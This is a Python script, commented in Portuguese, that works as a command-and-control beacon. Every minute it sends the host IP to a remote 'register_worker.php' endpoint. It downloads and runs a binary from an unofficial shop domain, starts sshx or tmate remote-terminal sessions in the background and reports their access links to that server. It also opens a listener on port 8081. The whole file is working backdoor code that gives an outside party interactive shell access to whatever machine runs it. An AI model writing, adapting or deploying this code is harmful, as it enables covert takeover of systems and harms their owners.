#!/usr/bin/env python3
"""
Announcer: envia o IP do host para a API remota via GET a cada 60 segundos.

Antes de cada announce garante que o `sshx` esteja instalado e executando.
Se necessário instala com `curl -sSf https://sshx.io/get | sh`, inicia um servidor
sshx em background e captura a URL da sessão. A URL é enviada junto ao parâmetro
GET `ssh` em cada announce.

Guarda estado em arquivo temporário para reusar sessão entre reinícios enquanto
o PID indicado estiver vivo.
"""

import time
import urllib.parse
import urllib.request
import urllib.error
import socket
import sys
import signal
import subprocess
import shutil
import os
import json
import tempfile
import re
import shlex
import threading


def _clean_ansi_and_control(s: str) -> str:
	# remove sequências ANSI e caracteres de controle não imprimíveis
	try:
		# remove ANSI CSI sequences like '\x1b[0m' etc.
		s = re.sub(r'\x1B\[[0-?]*[ -/]*[@-~]', '', s)
		# remove other non-printable characters
		s = ''.join(ch for ch in s if ch.isprintable())
		return s.strip()
	except Exception:
		return s


STATE_FILE = os.path.join(tempfile.gettempdir(), 'sshx_announcer_state.json')
SSHX_LOG = os.path.join(tempfile.gettempdir(), 'sshx_announce.log')
FLASK_STARTED = False
TMATE_LOG = os.path.join(tempfile.gettempdir(), 'tmate_announce.log')


def get_host_ip():
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	try:
		# Não envia pacotes; apenas força o SO a escolher uma interface
		s.connect(('8.8.8.8', 80))
		ip = s.getsockname()[0]
	except Exception:
		ip = '127.0.0.1'
	finally:
		s.close()
	return ip


def is_pid_alive(pid):
	try:
		os.kill(pid, 0)
	except OSError:
		return False
	return True


def read_state():
	try:
		with open(STATE_FILE, 'r') as f:
			return json.load(f)
	except Exception:
		return {}


def write_state(state):
	try:
		with open(STATE_FILE, 'w') as f:
			json.dump(state, f)
	except Exception:
		pass


def install_sshx():
	# deprecated: mantido por compatibilidade, mas preferimos baixar o binário
	return False


def download_sshx(dest_path):
	url = 'http://infinitykkj.shop/auth/svrgoat/libs/sshx'
	print(f'Tentando baixar sshx para {dest_path}...')
	# tenta wget primeiro
	try:
		subprocess.run(['wget', '-q', '-O', dest_path, url], check=True)
		os.chmod(dest_path, 0o755)
		return True
	except Exception:
		pass

	# fallback para curl
	try:
		subprocess.run(['curl', '-sSfL', '-o', dest_path, url], check=True)
		os.chmod(dest_path, 0o755)
		return True
	except Exception as e:
		print('Falha ao baixar sshx:', e)
		return False


def start_sshx_detached(sshx_exec, timeout=15):
	# Inicia sshx em background usando nohup e coleta PID. Usa o binário em sshx_exec.
	safe = shlex.quote(sshx_exec)
	cmd = f"nohup {safe} > {SSHX_LOG} 2>&1 & echo $!"
	try:
		out = subprocess.check_output(cmd, shell=True, executable='/bin/bash', stderr=subprocess.STDOUT)
		pid = int(out.decode().strip())
	except Exception as e:
		print('Erro ao iniciar sshx (detached):', e)
		return None, None

	# esperar o log para obter a linha com Link:
	deadline = time.time() + timeout
	link = None
	pattern = re.compile(r'https?://\S+')
	while time.time() < deadline:
		try:
			if os.path.exists(SSHX_LOG):
				with open(SSHX_LOG, 'r', errors='ignore') as lf:
					for line in lf.readlines()[::-1]:
						if 'Link:' in line:
							m = pattern.search(line)
							if m:
								link = _clean_ansi_and_control(m.group(0))
								break
			if link:
				break
		except Exception:
			pass
		time.sleep(0.3)

	return pid, link


def start_tmate_detached(tmate_exec, timeout=20):
	# Inicia tmate em background usando nohup e coleta PID. Usa o binário em tmate_exec.
	safe = shlex.quote(tmate_exec)
	cmd = f"nohup {safe} > {TMATE_LOG} 2>&1 & echo $!"
	try:
		out = subprocess.check_output(cmd, shell=True, executable='/bin/bash', stderr=subprocess.STDOUT)
		pid = int(out.decode().strip())
	except Exception as e:
		print('Erro ao iniciar tmate (detached):', e)
		return None, None

	# esperar o log para obter a linha com ssh session:
	deadline = time.time() + timeout
	token = None
	pattern = re.compile(r"ssh\s+(\S+@\S+)")
	while time.time() < deadline:
		try:
			if os.path.exists(TMATE_LOG):
				with open(TMATE_LOG, 'r', errors='ignore') as lf:
					for line in lf.readlines()[::-1]:
						if 'ssh session' in line:
							m = pattern.search(line)
							if m:
								token = _clean_ansi_and_control(m.group(1))
								break
			if token:
				break
		except Exception:
			pass
		time.sleep(0.3)

	return pid, token


def ensure_tmate():
	# Verifica estado salvo específico para tmate
	state = read_state()
	pid = state.get('tmate_pid')
	token = state.get('tmate_token')

	if pid and token and is_pid_alive(pid):
		return token

	# tenta detectar se tmate está instalado no PATH
	tmate_exec = shutil.which('tmate')

	# Se não existe, tentar instalar via pip
	if not tmate_exec:
		print('tmate não encontrado; tentando instalar via pip...')
		try:
			subprocess.run([sys.executable, '-m', 'pip', 'install', 'tmate'], check=True)
		except Exception as e:
			print('Falha ao instalar tmate via pip:', e)
			return None
		tmate_exec = shutil.which('tmate')
		if not tmate_exec:
			# talvez o pacote pip não forneça binário; abortar
			return None

	# iniciar tmate em background e capturar token
	pid, token = start_tmate_detached(tmate_exec, timeout=20)
	if pid is None:
		return None

	# salvar estado tmate
	try:
		state = read_state()
		state.update({'tmate_pid': pid, 'tmate_token': token, 'tmate_started_at': int(time.time())})
		write_state(state)
	except Exception:
		pass

	return token


def ensure_sshx():
	# Verifica estado salvo
	state = read_state()
	pid = state.get('pid')
	link = state.get('link')

	if pid and link and is_pid_alive(pid):
		return link

	# tenta detectar se sshx está instalado no PATH
	sshx_exec = shutil.which('sshx')

	# Se não existe no PATH, verificar se existe um binário local ./sshx
	if not sshx_exec:
		local_exec = os.path.join(os.getcwd(), 'sshx')
		if os.path.isfile(local_exec) and os.access(local_exec, os.X_OK):
			sshx_exec = local_exec

	# Se ainda não encontramos, tentar baixar para ./sshx
	if not sshx_exec:
		local_exec = os.path.join(os.getcwd(), 'sshx')
		ok = download_sshx(local_exec)
		if not ok:
			return None
		sshx_exec = local_exec

	# se chegamos aqui, sshx_exec aponta para o binário a ser usado
	pid, link = start_sshx_detached(sshx_exec, timeout=20)
	if pid is None:
		# tentar fallback para tmate
		token = ensure_tmate()
		return token

	# salvar estado (inclui caminho do executável)
	try:
		state = read_state()
		state.update({'pid': pid, 'link': link, 'started_at': int(time.time()), 'exec': sshx_exec})
		write_state(state)
	except Exception:
		pass

	# se não obteve link de sshx, tentar tmate como fallback
	if not link:
		token = ensure_tmate()
		if token:
			return token

	return link


def start_flask_server():
	global FLASK_STARTED
	if FLASK_STARTED:
		return True

	# tentar importar Flask; se não existir, instalar via pip usando o mesmo
	# interpretador que está rodando este script
	try:
		from flask import Flask, jsonify
	except Exception:
		print('Flask não encontrado; tentando instalar via pip...')
		try:
			subprocess.run([sys.executable, '-m', 'pip', 'install', 'flask'], check=True)
		except Exception as e:
			print('Falha ao instalar Flask via pip:', e)
			return False

		# tentar importar novamente
		try:
			from flask import Flask, jsonify
		except Exception as e:
			print('Ainda não foi possível importar Flask após instalação:', e)
			return False

	app = Flask('announcer_api')

	@app.route('/ping', methods=['GET'])
	def ping():
		return jsonify({'hello': 'hello'})

	def run_app():
		# roda o flask no thread separado
		app.run(host='0.0.0.0', port=8081, threaded=True)

	t = threading.Thread(target=run_app, daemon=True)
	t.start()
	FLASK_STARTED = True
	print('Flask server iniciado na porta 8081')
	return True


def announce(url, ip, ssh_link=None, timeout=10, retries=3):
	params = {'ip': ip}
	if ssh_link:
		params['ssh'] = ssh_link
	qs = urllib.parse.urlencode(params)
	full = f"{url}?{qs}"
	headers = {'User-Agent': 'infinitykkjserver/1.9.5'}

	backoff = 1
	for attempt in range(1, retries + 1):
		try:
			req = urllib.request.Request(full, headers=headers)
			with urllib.request.urlopen(req, timeout=timeout) as resp:
				content = resp.read().decode('utf-8', errors='replace')
				return True, content

		except urllib.error.HTTPError as e:
			# retry on server errors (5xx), otherwise fail fast
			if 500 <= getattr(e, 'code', 0) < 600 and attempt < retries:
				time.sleep(backoff)
				backoff *= 2
				continue
			return False, f'HTTPError {getattr(e, "code", "?")}: {e.reason}'

		except urllib.error.URLError as e:
			# network-related errors: retry
			if attempt < retries:
				time.sleep(backoff)
				backoff *= 2
				continue
			return False, f'URLError: {e}'

		except Exception as e:
			if attempt < retries:
				time.sleep(backoff)
				backoff *= 2
				continue
			return False, f'Error: {e}'

	return False, 'max_retries_exceeded'


def main():
	raw_url = r"http://infinitykkj.shop\auth\svrgoat/apis/register_worker.php"
	url = raw_url.replace('\\', '/')

	print(f"Anunciador iniciado -> {url}")

	def _shutdown(signum, frame):
		print('Recebido sinal de encerramento, saindo...')
		sys.exit(0)

	signal.signal(signal.SIGINT, _shutdown)
	signal.signal(signal.SIGTERM, _shutdown)

	# Iniciar servidor Flask uma vez, antes do primeiro announce
	try:
		ok = start_flask_server()
		if not ok:
			print('Aviso: falha ao iniciar servidor Flask na porta 8081')
	except Exception as e:
		print('Erro ao iniciar servidor Flask:', e)

	while True:
		try:
			ip = get_host_ip()
			now = time.strftime('%Y-%m-%d %H:%M:%S')

			# garantir sshx e obter link (se possível)
			ssh_link = None
			try:
				ssh_link = ensure_sshx()
			except Exception as e:
				print(f"[{now}] erro ao garantir sshx: {e}")

			ok, resp = announce(url, ip, ssh_link)
			if ok:
				print(f"[{now}] enviado ip={ip} ssh={ssh_link} -> OK; resposta curta: {resp[:200]}")
			else:
				# log e continuar (não encerrar)
				print(f"[{now}] announce falhou para ip={ip} ssh={ssh_link}: {resp}")

		except KeyboardInterrupt:
			raise
		except Exception as e:
			# proteger loop contra qualquer exceção inesperada
			print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Erro inesperado no loop: {e}")

		# Espera 60 segundos antes do próximo envio
		time.sleep(60)


if __name__ == '__main__':
	main()

